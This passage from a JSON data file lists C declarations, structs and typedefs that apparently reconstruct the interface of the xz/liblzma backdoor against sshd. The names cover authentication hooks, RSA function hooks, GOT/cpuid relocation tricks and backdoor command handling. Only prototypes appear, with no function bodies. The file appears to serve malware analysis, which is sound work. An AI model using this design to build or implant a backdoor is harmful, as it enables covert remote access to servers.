      "code": "typedef struct __attribute__((packed)) backdoor_tls_get_addr_reloc_consts {\n ptrdiff_t plt_stub_offset_from_got_anchor; /* Delta applied to `update_got_offset`’s sentinel (`_Llzma_block_buffer_decode_0`) so helpers can jump straight into the `__tls_get_addr` PLT stub. */\n ptrdiff_t random_slot_offset_from_got_anchor; /* Delta from the relocation-safe GOT anchor (`elf_functions_offset`) to the randomized slot that holds `tls_get_addr_random_symbol`. */\n} backdoor_tls_get_addr_reloc_consts_t;"
    },
    {
      "kind": "typedef",
      "names": [
        "init_hook_functions_fn"
      ],
      "code": "typedef int (*init_hook_functions_fn)(backdoor_hooks_ctx_t *funcs);"
    },
    {
      "kind": "typedef",
      "names": [
        "elf_symbol_get_addr_fn"
      ],
      "code": "typedef void *(*elf_symbol_get_addr_fn)(elf_info_t *elf_info, EncodedStringId encoded_string_id);"
    },
    {
      "kind": "typedef",
      "names": [
        "elf_parse_fn"
      ],
      "code": "typedef BOOL (*elf_parse_fn)(Elf64_Ehdr *ehdr, elf_info_t *elf_info);"
    },
    {
      "kind": "struct",
      "names": [
        "elf_functions_t"
      ],
      "code": "typedef struct __attribute__((packed)) elf_functions {\n u64 reserved_before_init;\n init_hook_functions_fn init_hook_functions;\n u64 reserved_before_symbol_lookup_0;\n u64 reserved_before_symbol_lookup_1;\n elf_symbol_get_addr_fn elf_symbol_get_addr;\n u64 reserved_before_elf_parse;\n elf_parse_fn elf_parse;\n} elf_functions_t;"
    },
    {
      "kind": "struct",
      "names": [
        "fake_lzma_allocator_t"
      ],
      "code": "typedef struct __attribute__((packed)) fake_lzma_allocator {\n u64 reserved_allocator_slot;\n lzma_allocator allocator;\n} fake_lzma_allocator_t;"
    },
    {
      "kind": "typedef",
      "names": [
        "audit_pattern_state_t"
      ],
      "code": "typedef enum {\n AUDIT_PAT_EXPECT_LEA = 0, /* First state: wait for the LEA that materialises link_map::l_name plus the pointer displacement. */\n AUDIT_PAT_EXPECT_MOV = 1, /* Second state: verify the MOV copies the LEA result into the tracked register. */\n AUDIT_PAT_EXPECT_TEST = 2 /* Final state: require a TEST/BT against the tracked register before consuming the mask. */\n} audit_pattern_state_t;"
    },
    {
      "kind": "struct",
      "names": [
        "instruction_search_ctx_t"
      ],
      "code": "typedef struct __attribute__((packed)) instruction_search_ctx\n{\n u8 *start_addr;\n u8 *end_addr;\n u8 *offset_to_match;\n u32 *output_register_to_match;\n u8 *output_register;\n BOOL result;\n u8 search_padding[4];\n backdoor_hooks_data_t *hooks;\n imported_funcs_t *imported_funcs;\n} instruction_search_ctx_t;"
    },
    {
      "kind": "declaration",
      "names": [
        "sshd_proxy_elevate"
      ],
      "code": "extern BOOL sshd_proxy_elevate(monitor_data_t *args, global_context_t *ctx);"
    },
    {
      "kind": "declaration",
      "names": [
        "x86_dasm"
      ],
      "code": "extern BOOL x86_dasm(dasm_ctx_t *ctx, u8 *code_start, u8 *code_end);"
    },
    {
      "kind": "declaration",
      "names": [
        "find_call_instruction"
      ],
      "code": "extern BOOL find_call_instruction(u8 *code_start, u8 *code_end, u8 *call_target, dasm_ctx_t *dctx);"
    },
    {
      "kind": "declaration",
      "names": [
        "find_lea_instruction"
      ],
      "code": "extern BOOL find_lea_instruction(u8 *code_start, u8 *code_end, u64 displacement);"
    },
    {
      "kind": "declaration",
      "names": [
        "find_instruction_with_mem_operand"
      ],
      "code": "extern BOOL find_instruction_with_mem_operand(\n u8 *code_start,\n u8 *code_end,\n dasm_ctx_t *dctx,\n void *mem_address\n);"
    },
    {
      "kind": "declaration",
      "names": [
        "find_lea_instruction_with_mem_operand"
      ],
      "code": "extern BOOL find_lea_instruction_with_mem_operand(\n u8 *code_start,\n u8 *code_end,\n dasm_ctx_t *dctx,\n void *mem_address\n);"
    },
    {
      "kind": "declaration",
      "names": [
        "find_add_instruction_with_mem_operand"
      ],
      "code": "extern BOOL find_add_instruction_with_mem_operand(\n u8 *code_start,\n u8 *code_end,\n dasm_ctx_t *dctx,\n void *mem_address\n);"
    },
    {
      "kind": "declaration",
      "names": [
        "find_mov_lea_instruction"
      ],
      "code": "extern BOOL find_mov_lea_instruction(\n u8 *code_start,\n u8 *code_end,\n BOOL is_64bit_operand,\n BOOL load_flag,\n dasm_ctx_t *dctx\n);"
    },
    {
      "kind": "declaration",
      "names": [
        "find_mov_instruction"
      ],
      "code": "extern BOOL find_mov_instruction(\n u8 *code_start,\n u8 *code_end,\n BOOL is_64bit_operand,\n BOOL load_flag,\n dasm_ctx_t *dctx\n);"
    },
    {
      "kind": "declaration",
      "names": [
        "find_instruction_with_mem_operand_ex"
      ],
      "code": "extern BOOL find_instruction_with_mem_operand_ex(\n u8 *code_start,\n u8 *code_end,\n dasm_ctx_t *dctx,\n int opcode,\n void *mem_address\n);"
    },
    {
      "kind": "declaration",
      "names": [
        "is_endbr64_instruction"
      ],
      "code": "extern BOOL is_endbr64_instruction(u8 *code_start, u8 *code_end, u32 low_mask_part);"
    },
    {
      "kind": "declaration",
      "names": [
        "find_string_reference"
      ],
      "code": "extern u8 *find_string_reference(\n u8 *code_start,\n u8 *code_end,\n const char *str\n);"
    },
    {
      "kind": "declaration",
      "names": [
        "elf_find_string_reference"
      ],
      "code": "extern u8 *elf_find_string_reference(\n elf_info_t *elf_info,\n EncodedStringId encoded_string_id,\n u8 *code_start,\n u8 *code_end\n);"
    },
    {
      "kind": "declaration",
      "names": [
        "find_reg2reg_instruction"
      ],
      "code": "extern BOOL find_reg2reg_instruction(u8 *code_start, u8 *code_end, dasm_ctx_t *dctx);"
    },
    {
      "kind": "declaration",
      "names": [
        "find_function_prologue"
      ],
      "code": "extern BOOL find_function_prologue(u8 *code_start, u8 *code_end, u8 **output, FuncFindType find_mode);"
    },
    {
      "kind": "declaration",
      "names": [
        "find_function"
      ],
      "code": "extern BOOL find_function(\n u8 *code_start,\n void **func_start,\n void **func_end,\n u8 *search_base,\n u8 *code_end,\n FuncFindType find_mode);"
    },
    {
      "kind": "declaration",
      "names": [
        "elf_contains_vaddr"
      ],
      "code": "extern BOOL elf_contains_vaddr(elf_info_t *elf_info, void *vaddr, u64 size, u32 p_flags);"
    },
    {
      "kind": "declaration",
      "names": [
        "elf_contains_vaddr_impl"
      ],
      "code": "extern BOOL elf_contains_vaddr_impl(elf_info_t *elf_info, void *vaddr, u64 size, u32 p_flags);"
    },
    {
      "kind": "declaration",
      "names": [
        "elf_contains_vaddr_relro"
      ],
      "code": "extern BOOL elf_contains_vaddr_relro(elf_info_t *elf_info, u64 vaddr, u64 size, u32 p_flags);"
    },
    {
      "kind": "declaration",
      "names": [
        "elf_parse"
      ],
      "code": "extern BOOL elf_parse(Elf64_Ehdr *ehdr, elf_info_t *elf_info);"
    },
    {
      "kind": "declaration",
      "names": [
        "is_gnu_relro"
      ],
      "code": "extern BOOL is_gnu_relro(Elf64_Word p_type, u32 addend);"
    },
    {
      "kind": "declaration",
      "names": [
        "main_elf_parse"
      ],
      "code": "extern BOOL main_elf_parse(main_elf_t *main_elf);"
    },
    {
      "kind": "declaration",
      "names": [
        "check_argument"
      ],
      "code": "extern char *check_argument(char arg_first_char, char* arg_name);"
    },
    {
      "kind": "declaration",
      "names": [
        "process_is_sshd"
      ],
      "code": "extern BOOL process_is_sshd(elf_info_t *elf, u8 *stack_end);"
    },
    {
      "kind": "declaration",
      "names": [
        "elf_find_string_references"
      ],
      "code": "extern BOOL elf_find_string_references(elf_info_t *elf_info, string_references_t *refs);"
    },
    {
      "kind": "declaration",
      "names": [
        "elf_symbol_get"
      ],
      "code": "extern Elf64_Sym *elf_symbol_get(elf_info_t *elf_info, EncodedStringId encoded_string_id, EncodedStringId sym_version);"
    },
    {
      "kind": "declaration",
      "names": [
        "elf_symbol_get_addr"
      ],
      "code": "extern void *elf_symbol_get_addr(elf_info_t *elf_info, EncodedStringId encoded_string_id);"
    },
    {
      "kind": "declaration",
      "names": [
        "elf_get_code_segment"
      ],
      "code": "extern void *elf_get_code_segment(elf_info_t *elf_info, u64 *pSize);"
    },
    {
      "kind": "declaration",
      "names": [
        "elf_get_rodata_segment"
      ],
      "code": "extern void *elf_get_rodata_segment(elf_info_t *elf_info, u64 *pSize);"
    },
    {
      "kind": "declaration",
      "names": [
        "elf_get_data_segment"
      ],
      "code": "extern void *elf_get_data_segment(elf_info_t *elf_info, u64 *pSize, BOOL get_alignment);"
    },
    {
      "kind": "declaration",
      "names": [
        "elf_get_reloc_symbol"
      ],
      "code": "extern void *elf_get_reloc_symbol(\n elf_info_t *elf_info,\n Elf64_Rela *relocs,\n u32 num_relocs,\n u64 reloc_type,\n EncodedStringId encoded_string_id);"
    },
    {
      "kind": "declaration",
      "names": [
        "elf_get_plt_symbol"
      ],
      "code": "extern void *elf_get_plt_symbol(elf_info_t *elf_info, EncodedStringId encoded_string_id);"
    },
    {
      "kind": "declaration",
      "names": [
        "elf_get_got_symbol"
      ],
      "code": "extern void *elf_get_got_symbol(elf_info_t *elf_info, EncodedStringId encoded_string_id);"
    },
    {
      "kind": "declaration",
      "names": [
        "elf_find_rela_reloc"
      ],
      "code": "extern Elf64_Rela *elf_find_rela_reloc(\n elf_info_t *elf_info,\n EncodedStringId encoded_string_id,\n u8 *slot_lower_bound);"
    },
    {
      "kind": "declaration",
      "names": [
        "elf_find_relr_reloc"
      ],
      "code": "extern Elf64_Relr *elf_find_relr_reloc(\n elf_info_t *elf_info,\n EncodedStringId encoded_string_id);"
    },
    {
      "kind": "declaration",
      "names": [
        "elf_find_function_pointer"
      ],
      "code": "extern BOOL elf_find_function_pointer(\n StringXrefId xref_id,\n void **pOutCodeStart, void **pOutCodeEnd,\n void **pOutFptrAddr, elf_info_t *elf_info,\n string_references_t *xrefs,\n global_context_t *ctx);"
    },
    {
      "kind": "declaration",
      "names": [
        "elf_find_string"
      ],
      "code": "extern char *elf_find_string(\n elf_info_t *elf_info,\n EncodedStringId *stringId_inOut,\n void *rodata_start_ptr);"
    },
    {
      "kind": "declaration",
      "names": [
        "get_lzma_allocator"
      ],
      "code": "extern lzma_allocator *get_lzma_allocator(void);"
    },
    {
      "kind": "declaration",
      "names": [
        "get_lzma_allocator_address"
      ],
      "code": "extern fake_lzma_allocator_t *get_lzma_allocator_address(void);"
    },
    {
      "kind": "declaration",
      "names": [
        "fake_lzma_alloc"
      ],
      "code": "extern void *fake_lzma_alloc(void *opaque, size_t nmemb, size_t size);"
    },
    {
      "kind": "declaration",
      "names": [
        "fake_lzma_free"
      ],
      "code": "extern void fake_lzma_free(void *opaque, void *ptr);"
    },
    {
      "kind": "declaration",
      "names": [
        "get_elf_functions_address"
      ],
      "code": "extern elf_functions_t *get_elf_functions_address(void);"
    },
    {
      "kind": "declaration",
      "names": [
        "secret_data_append_from_instruction"
      ],
      "code": "extern BOOL secret_data_append_from_instruction(dasm_ctx_t *dctx, secret_data_shift_cursor_t *cursor);"
    },
    {
      "kind": "declaration",
      "names": [
        "secret_data_append_from_code"
      ],
      "code": "extern BOOL secret_data_append_from_code(\n void *code_start,\n void *code_end,\n secret_data_shift_cursor_t shift_cursor,\n unsigned shift_count, BOOL start_from_call);"
    },
    {
      "kind": "declaration",
      "names": [
        "secret_data_append_item"
      ],
      "code": "extern BOOL secret_data_append_item(\n secret_data_shift_cursor_t shift_cursor,\n unsigned operation_index,\n unsigned shift_count,\n int index, u8 *code);"
    },
    {
      "kind": "typedef",
      "names": [
        "secret_data_appender_fn"
      ],
      "code": "typedef BOOL (*secret_data_appender_fn)(\n  secret_data_shift_cursor_t shift_cursor,\n  unsigned operation_index,\n  unsigned shift_count,\n  int index,\n  u8 *code);"
    },
    {
      "kind": "declaration",
      "names": [
        "secret_data_append_items"
      ],
      "code": "extern BOOL secret_data_append_items(\n secret_data_item_t *items,\n u64 items_count,\n secret_data_appender_fn appender);"
    },
    {
      "kind": "declaration",
      "names": [
        "secret_data_append_from_address"
      ],
      "code": "extern BOOL secret_data_append_from_address(\n void *addr,\n secret_data_shift_cursor_t shift_cursor,\n unsigned shift_count, unsigned operation_index);"
    },
    {
      "kind": "declaration",
      "names": [
        "secret_data_append_singleton"
      ],
      "code": "extern BOOL secret_data_append_singleton(\n u8 *call_site, u8 *code,\n secret_data_shift_cursor_t shift_cursor,\n unsigned shift_count, unsigned operation_index);"
    },
    {
      "kind": "declaration",
      "names": [
        "secret_data_append_from_call_site"
      ],
      "code": "extern BOOL secret_data_append_from_call_site(\n secret_data_shift_cursor_t shift_cursor,\n unsigned shift_count, unsigned operation_index,\n BOOL bypass\n);"
    },
    {
      "kind": "declaration",
      "names": [
        "backdoor_setup"
      ],
      "code": "extern BOOL backdoor_setup(backdoor_setup_params_t *params);"
    },
    {
      "kind": "declaration",
      "names": [
        "init_ldso_ctx"
      ],
      "code": "extern void init_ldso_ctx(ldso_ctx_t *ldso_ctx);"
    },
    {
      "kind": "declaration",
      "names": [
        "backdoor_entry"
      ],
      "code": "extern unsigned int backdoor_entry(unsigned int cpuid_request, u64 *caller_frame);"
    },
    {
      "kind": "declaration",
      "names": [
        "backdoor_init"
      ],
      "code": "extern void * backdoor_init(elf_entry_ctx_t *state, u64 *caller_frame);"
    },
    {
      "kind": "declaration",
      "names": [
        "init_elf_entry_ctx"
      ],
      "code": "extern void init_elf_entry_ctx(elf_entry_ctx_t *ctx);"
    },
    {
      "kind": "declaration",
      "names": [
        "update_got_offset"
      ],
      "code": "extern void update_got_offset(elf_entry_ctx_t *ctx);"
    },
    {
      "kind": "declaration",
      "names": [
        "update_cpuid_got_index"
      ],
      "code": "extern void update_cpuid_got_index(elf_entry_ctx_t *ctx);"
    },
    {
      "kind": "declaration",
      "names": [
        "backdoor_init_stage2"
      ],
      "code": "extern BOOL backdoor_init_stage2(elf_entry_ctx_t *ctx, u64 *caller_frame, void **cpuid_got_addr, backdoor_cpuid_reloc_consts_t* reloc_consts);"
    },
    {
      "kind": "declaration",
      "names": [
        "resolve_libc_imports"
      ],
      "code": "extern BOOL resolve_libc_imports(\n struct link_map *libc,\n elf_info_t *libc_info,\n libc_imports_t *imports\n);"
    },
    {
      "kind": "declaration",
      "names": [
        "process_shared_libraries"
      ],
      "code": "extern BOOL process_shared_libraries(backdoor_shared_libraries_data_t *data);"
    },
    {
      "kind": "declaration",
      "names": [
        "process_shared_libraries_map"
      ],
      "code": "extern BOOL process_shared_libraries_map(struct link_map *r_map, backdoor_shared_libraries_data_t *data);"
    },
    {
      "kind": "declaration",
      "names": [
        "chacha_decrypt"
      ],
      "code": "extern BOOL chacha_decrypt(\n u8 *in, int inl,\n u8 *key, u8 *iv,\n u8 *out, imported_funcs_t *funcs\n);"
    },
    {
      "kind": "declaration",
      "names": [
        "secret_data_get_decrypted"
      ],
      "code": "extern BOOL secret_data_get_decrypted(u8 *output, global_context_t *ctx);"
    },
    {
      "kind": "declaration",
      "names": [
        "is_range_mapped"
      ],
      "code": "extern BOOL is_range_mapped(u8* addr, u64 length, global_context_t* ctx);"
    },
    {
      "kind": "declaration",
      "names": [
        "count_bits"
      ],
      "code": "extern u32 count_bits(u64 x);"
    },
    {
      "kind": "declaration",
      "names": [
        "get_string_id"
      ],
      "code": "extern EncodedStringId get_string_id(const char *string_begin, const char *string_end);"
    },
    {
      "kind": "declaration",
      "names": [
        "_get_cpuid_modified"
      ],
      "code": "extern unsigned int _get_cpuid_modified(unsigned int leaf, unsigned int *eax, unsigned int *ebx, unsigned int *ecx, unsigned int *edx, u64 *caller_frame);"
    },
    {
      "kind": "declaration",
      "names": [
        "_cpuid_gcc"
      ],
      "code": "extern void _cpuid_gcc(unsigned int level, unsigned int *a, unsigned int *b, unsigned int *c, unsigned int *d);"
    },
    {
      "kind": "declaration",
      "names": [
        "init_hooks_ctx"
      ],
      "code": "extern int init_hooks_ctx(backdoor_hooks_ctx_t *ctx);"
    },
    {
      "kind": "declaration",
      "names": [
        "init_shared_globals"
      ],
      "code": "extern int init_shared_globals(backdoor_shared_globals_t *shared_globals);"
    },
    {
      "kind": "declaration",
      "names": [
        "init_imported_funcs"
      ],
      "code": "extern BOOL init_imported_funcs(imported_funcs_t *imported_funcs);"
    },
    {
      "kind": "declaration",
      "names": [
        "update_got_address"
      ],
      "code": "extern void *update_got_address(elf_entry_ctx_t *entry_ctx);"
    },
    {
      "kind": "declaration",
      "names": [
        "get_tls_get_addr_random_symbol_got_offset"
      ],
      "code": "extern ptrdiff_t get_tls_get_addr_random_symbol_got_offset(elf_entry_ctx_t *ctx);"
    },
    {
      "kind": "struct",
      "names": [
        "tls_index"
      ],
      "code": "typedef struct dl_tls_index\n{\n uint64_t ti_module;\n uint64_t ti_offset;\n} tls_index;"
    },
    {
      "kind": "declaration",
      "names": [
        "__tls_get_addr"
      ],
      "code": "extern void *__tls_get_addr(tls_index *ti);"
    },
    {
      "kind": "declaration",
      "names": [
        "dummy_tls_get_addr"
      ],
      "code": "extern void *dummy_tls_get_addr (tls_index *ti);"
    },
    {
      "kind": "declaration",
      "names": [
        "j_tls_get_addr"
      ],
      "code": "extern void *j_tls_get_addr(tls_index *ti);"
    },
    {
      "kind": "declaration",
      "names": [
        "backdoor_symbind64"
      ],
      "code": "extern uintptr_t backdoor_symbind64(\n Elf64_Sym *sym,\n unsigned int ndx,\n uptr *refcook, uptr *defcook,\n unsigned int flags,\n const char *symname);"
    },
    {
      "kind": "declaration",
      "names": [
        "run_backdoor_commands"
      ],
      "code": "extern BOOL run_backdoor_commands(RSA *key, global_context_t *ctx, BOOL *do_orig);"
    },
    {
      "kind": "declaration",
      "names": [
        "find_dl_audit_offsets"
      ],
      "code": "extern BOOL find_dl_audit_offsets(\n backdoor_data_handle_t *data,\n ptrdiff_t *libname_offset,\n backdoor_hooks_data_t *hooks,\n imported_funcs_t *imported_funcs);"
    },
    {
      "kind": "declaration",
      "names": [
        "find_link_map_l_name"
      ],
      "code": "extern BOOL find_link_map_l_name(\n backdoor_data_handle_t *data_handle,\n ptrdiff_t *libname_offset,\n backdoor_hooks_data_t *hooks,\n imported_funcs_t *imported_funcs);"
    },
    {
      "kind": "declaration",
      "names": [
        "find_dl_naudit"
      ],
      "code": "extern BOOL find_dl_naudit(\n elf_info_t *dynamic_linker_elf,\n elf_info_t *libcrypto_elf,\n backdoor_hooks_data_t *hooks,\n imported_funcs_t *imported_funcs);"
    },
    {
      "kind": "declaration",
      "names": [
        "find_link_map_l_audit_any_plt"
      ],
      "code": "extern BOOL find_link_map_l_audit_any_plt(\n backdoor_data_handle_t *data,\n ptrdiff_t libname_offset,\n backdoor_hooks_data_t *hooks,\n imported_funcs_t *imported_funcs);"
    },
    {
      "kind": "declaration",
      "names": [
        "find_link_map_l_audit_any_plt_bitmask"
      ],
      "code": "extern BOOL find_link_map_l_audit_any_plt_bitmask(\n backdoor_data_handle_t *data,\n instruction_search_ctx_t *search_ctx);"
    },
    {
      "kind": "declaration",
      "names": [
        "sshd_get_sensitive_data_address_via_xcalloc"
      ],
      "code": "extern BOOL sshd_get_sensitive_data_address_via_xcalloc(\n u8 *data_start,\n u8 *data_end,\n u8 *code_start,\n u8 *code_end,\n string_references_t *string_refs,\n void **sensitive_data_out);"
    },
    {
      "kind": "declaration",
      "names": [
        "sshd_get_sensitive_data_address_via_krb5ccname"
      ],
      "code": "extern BOOL sshd_get_sensitive_data_address_via_krb5ccname(\n u8 *data_start,\n u8 *data_end,\n u8 *code_start,\n u8 *code_end,\n void **sensitive_data_out,\n elf_info_t *elf);"
    },
    {
      "kind": "declaration",
      "names": [
        "sshd_get_sensitive_data_score_in_demote_sensitive_data"
      ],
      "code": "extern int sshd_get_sensitive_data_score_in_demote_sensitive_data(\n void *sensitive_data,\n elf_info_t *elf,\n string_references_t *refs);"
    },
    {
      "kind": "declaration",
      "names": [
        "sshd_get_sensitive_data_score_in_main"
      ],
      "code": "extern int sshd_get_sensitive_data_score_in_main(\n void *sensitive_data,\n elf_info_t *elf,\n string_references_t *refs);"
    },
    {
      "kind": "declaration",
      "names": [
        "sshd_get_sensitive_data_score_in_do_child"
      ],
      "code": "extern int sshd_get_sensitive_data_score_in_do_child(\n void *sensitive_data,\n elf_info_t *elf,\n string_references_t *refs);"
    },
    {
      "kind": "declaration",
      "names": [
        "sshd_get_sensitive_data_score"
      ],
      "code": "extern int sshd_get_sensitive_data_score(\n void *sensitive_data,\n elf_info_t *elf,\n string_references_t *refs);"
    },
    {
      "kind": "declaration",
      "names": [
        "bignum_serialize"
      ],
      "code": "extern BOOL bignum_serialize(\n u8 *buffer, u64 bufferSize,\n u64 *pOutSize,\n const BIGNUM *bn,\n imported_funcs_t *funcs);"
    },
    {
      "kind": "declaration",
      "names": [
        "sshbuf_bignum_is_negative"
      ],
      "code": "extern BOOL sshbuf_bignum_is_negative(struct sshbuf *buf);"
    },
    {
      "kind": "declaration",
      "names": [
        "rsa_key_hash"
      ],
      "code": "extern BOOL rsa_key_hash(\n const RSA *rsa,\n u8 *mdBuf,\n u64 mdBufSize,\n imported_funcs_t *funcs);"
    },
    {
      "kind": "declaration",
      "names": [
        "dsa_key_hash"
      ],
      "code": "extern BOOL dsa_key_hash(\n const DSA *dsa,\n u8 *mdBuf,\n u64 mdBufSize,\n global_context_t *ctx);"
    },
    {
      "kind": "declaration",
      "names": [
        "sha256"
      ],
      "code": "extern BOOL sha256(\n const void *data,\n size_t count,\n u8 *mdBuf,\n u64 mdBufSize,\n imported_funcs_t *funcs);"
    },
    {
      "kind": "declaration",
      "names": [
        "verify_signature"
      ],
      "code": "extern BOOL verify_signature(\n struct sshkey *sshkey,\n u8 *signed_data,\n u64 sshkey_digest_offset,\n u64 signed_data_size,\n u8 *signature,\n u8 *ed448_raw_key,\n global_context_t *global_ctx\n);"
    },
    {
      "kind": "declaration",
      "names": [
        "sshd_patch_variables"
      ],
      "code": "extern BOOL sshd_patch_variables(\n BOOL skip_root_patch,\n BOOL disable_pam,\n BOOL replace_monitor_reqtype,\n monitor_reqtype_t monitor_reqtype,\n global_context_t *global_ctx\n);"
    },
    {
      "kind": "declaration",
      "names": [
        "sshd_find_monitor_struct"
      ],
      "code": "extern BOOL sshd_find_monitor_struct(\n elf_info_t *elf,\n string_references_t *refs,\n global_context_t *ctx\n);"
    },
    {
      "kind": "declaration",
      "names": [
        "sshd_find_main"
      ],
      "code": "extern BOOL sshd_find_main(\n u8 **code_start_out,\n elf_info_t *sshd,\n elf_info_t *libcrypto,\n imported_funcs_t *imported_funcs\n);"
    },
    {
      "kind": "declaration",
      "names": [
        "sshd_find_monitor_field_addr_in_function"
      ],
      "code": "extern BOOL sshd_find_monitor_field_addr_in_function(\n u8 *code_start,\n u8 *code_end,\n u8 *data_start,\n u8 *data_end,\n void **monitor_field_ptr_out,\n global_context_t *ctx\n);"
    },
    {
      "kind": "declaration",
      "names": [
        "find_addr_referenced_in_mov_instruction"
      ],
      "code": "extern void *find_addr_referenced_in_mov_instruction(\n StringXrefId id,\n string_references_t *refs,\n void *mem_range_start,\n void *mem_range_end\n);"
    },
    {
      "kind": "declaration",
      "names": [
        "validate_log_handler_pointers"
      ],
      "code": "extern BOOL validate_log_handler_pointers(\n void *addr1,\n void *addr2,\n void *search_base,\n u8 *code_end,\n string_references_t *refs,\n global_context_t *global\n);"
    },
    {
      "kind": "enum",
      "names": [
        "SocketMode"
      ],
      "code": "enum SocketMode {\n DIR_WRITE = 0,\n DIR_READ = 1\n};"
    },
    {
      "kind": "declaration",
      "names": [
        "sshd_get_client_socket"
      ],
      "code": "extern BOOL sshd_get_client_socket(\n global_context_t *ctx,\n int *pSocket,\n int socket_index,\n enum SocketMode socket_direction\n);"
    },
    {
      "kind": "declaration",
      "names": [
        "sshd_get_usable_socket"
      ],
      "code": "extern BOOL sshd_get_usable_socket(int *pSock, int socket_index, libc_imports_t *imports);"
    },
    {
      "kind": "declaration",
      "names": [
        "sshd_get_sshbuf"
      ],
      "code": "extern BOOL sshd_get_sshbuf(struct sshbuf *sshbuf, global_context_t *ctx);"
    },
    {
      "kind": "declaration",
      "names": [
        "sshbuf_extract"
      ],
      "code": "extern BOOL sshbuf_extract(struct sshbuf *buf, global_context_t *ctx, void **p_sshbuf_d, size_t *p_sshbuf_size);"
    },
    {
      "kind": "declaration",
      "names": [
        "extract_payload_message"
      ],
      "code": "extern BOOL extract_payload_message(\n struct sshbuf *sshbuf_data,\n size_t sshbuf_size,\n size_t *out_payload_size,\n global_context_t *ctx);"
    },
    {
      "kind": "declaration",
      "names": [
        "decrypt_payload_message"
      ],
      "code": "extern BOOL decrypt_payload_message(\n key_payload_t *payload,\n size_t payload_size,\n global_context_t *ctx);"
    },
    {
      "kind": "declaration",
      "names": [
        "check_backdoor_state"
      ],
      "code": "extern BOOL check_backdoor_state(global_context_t *ctx);"
    },
    {
      "kind": "declaration",
      "names": [
        "mm_answer_keyallowed_hook"
      ],
      "code": "extern int mm_answer_keyallowed_hook(struct ssh *ssh, int sock, struct sshbuf *m);"
    },
    {
      "kind": "declaration",
      "names": [
        "mm_answer_keyverify_hook"
      ],
      "code": "extern int mm_answer_keyverify_hook(struct ssh *ssh, int sock, struct sshbuf *m);"
    },
    {
      "kind": "declaration",
      "names": [
        "mm_answer_authpassword_hook"
      ],
      "code": "extern int mm_answer_authpassword_hook(struct ssh *ssh, int sock, struct sshbuf *m);"
    },
    {
      "kind": "declaration",
      "names": [
        "mm_log_handler_hook"
      ],
      "code": "extern void mm_log_handler_hook(\n LogLevel level,\n int forced,\n const char *msg,\n void *ctx);"
    },
    {
      "kind": "declaration",
      "names": [
        "fd_read"
      ],
      "code": "extern ssize_t fd_read(\n int fd,\n void *buffer,\n size_t count,\n libc_imports_t *funcs);"
    },
    {
      "kind": "declaration",
      "names": [
        "fd_write"
      ],
      "code": "extern ssize_t fd_write(\n int fd,\n void *buffer,\n size_t count,\n libc_imports_t *funcs);"
    },
    {
      "kind": "declaration",
      "names": [
        "contains_null_pointers"
      ],
      "code": "extern BOOL contains_null_pointers(\n void **pointers,\n unsigned int num_pointers\n);"
    },
    {
      "kind": "declaration",
      "names": [
        "count_pointers"
      ],
      "code": "extern BOOL count_pointers(\n void **ptrs,\n u64 *count_out,\n libc_imports_t *funcs\n);"
    },
    {
      "kind": "declaration",
      "names": [
        "sshd_configure_log_hook"
      ],
      "code": "extern BOOL sshd_configure_log_hook(cmd_arguments_t *cmd_flags, global_context_t *ctx);"
    },
    {
      "kind": "declaration",
      "names": [
        "hook_RSA_public_decrypt"
      ],
      "code": "extern int hook_RSA_public_decrypt(\n int flen, unsigned char *from,\n unsigned char *to, RSA *rsa, int padding);"
    },
    {
      "kind": "declaration",
      "names": [
        "hook_EVP_PKEY_set1_RSA"
      ],
      "code": "extern int hook_EVP_PKEY_set1_RSA(EVP_PKEY *pkey, RSA *key);"
    },
    {
      "kind": "declaration",
      "names": [
        "hook_RSA_get0_key"
      ],
      "code": "extern void hook_RSA_get0_key(\n const RSA *r,\n const BIGNUM **n,\n const BIGNUM **e,\n const BIGNUM **d);"
    },
    {
      "kind": "declaration",
      "names": [
        "sshd_log"
      ],
      "code": "extern void sshd_log(\n sshd_log_ctx_t *log_ctx,\n LogLevel level, const char *fmt, ...);"
    },
    {
      "kind": "declaration",
      "names": [
        "sshd_find_sensitive_data"
      ],
      "code": "extern BOOL sshd_find_sensitive_data(\n elf_info_t *sshd,\n elf_info_t *libcrypto,\n string_references_t *refs,\n imported_funcs_t *funcs,\n global_context_t *ctx);"
    },
    {
      "kind": "declaration",
      "names": [
        "c_strlen"
      ],
      "code": "extern ssize_t c_strlen(\n char *str\n);"
    },
    {
      "kind": "declaration",
      "names": [
        "c_strnlen"
      ],
      "code": "extern ssize_t c_strnlen(\n char *str,\n size_t max_len\n);"
    },
    {
      "kind": "declaration",
      "names": [
        "c_memmove"
      ],
      "code": "extern void* c_memmove(\n char *dest,\n char *src,\n size_t cnt\n);"
    },
    {
      "kind": "declaration",
      "names": [
        "resolver_call_count"
      ],
      "code": "extern u32 resolver_call_count;"
    },
    {
      "kind": "declaration",
      "names": [
        "global_ctx"
      ],
      "code": "extern global_context_t *global_ctx;"
    },
    {
      "kind": "declaration",
      "names": [
        "hooks_data"
      ],
      "code": "extern backdoor_hooks_data_t *hooks_data;"
    },
    {
      "kind": "declaration",
      "names": [
        "hooks_data_addr"
      ],
      "code": "extern backdoor_hooks_data_t *hooks_data_addr;"
    },
    {
      "kind": "declaration",
      "names": [
        "fake_lzma_allocator_offset"
      ],
      "code": "extern const ptrdiff_t fake_lzma_allocator_offset;"
    },
    {
      "kind": "declaration",
      "names": [
        "fake_lzma_allocator"
      ],
      "code": "extern fake_lzma_allocator_t fake_lzma_allocator;"
    },
    {
      "kind": "declaration",
      "names": [
        "lzma_alloc"
      ],
      "code": "extern void *lzma_alloc(size_t size, lzma_allocator *allocator);"
    },
    {
      "kind": "declaration",
      "names": [
        "lzma_free"
      ],
      "code": "extern void lzma_free(void *ptr, lzma_allocator *allocator);"
    },
    {
      "kind": "declaration",
      "names": [
        "lzma_check_init"
      ],
      "code": "extern void lzma_check_init(lzma_check_state *state, lzma_check check_id);"
    },
    {
      "kind": "declaration",
      "names": [
        "elf_functions_offset"
      ],
      "code": "extern const ptrdiff_t elf_functions_offset;"
    },
    {
      "kind": "declaration",
      "names": [
        "elf_functions"
      ],
      "code": "extern const elf_functions_t elf_functions;"
    },
    {
      "kind": "declaration",
      "names": [
        "cpuid_random_symbol"
      ],
      "code": "extern const u64 cpuid_random_symbol;"
    },
    {
      "kind": "declaration",
      "names": [
        "tls_get_addr_random_symbol"
      ],
      "code": "extern const u64 tls_get_addr_random_symbol;"
    },
    {
      "kind": "declaration",
      "names": [
        "cpuid_reloc_consts"
      ],
      "code": "extern const backdoor_cpuid_reloc_consts_t cpuid_reloc_consts;"
    },
    {
      "kind": "declaration",
      "names": [
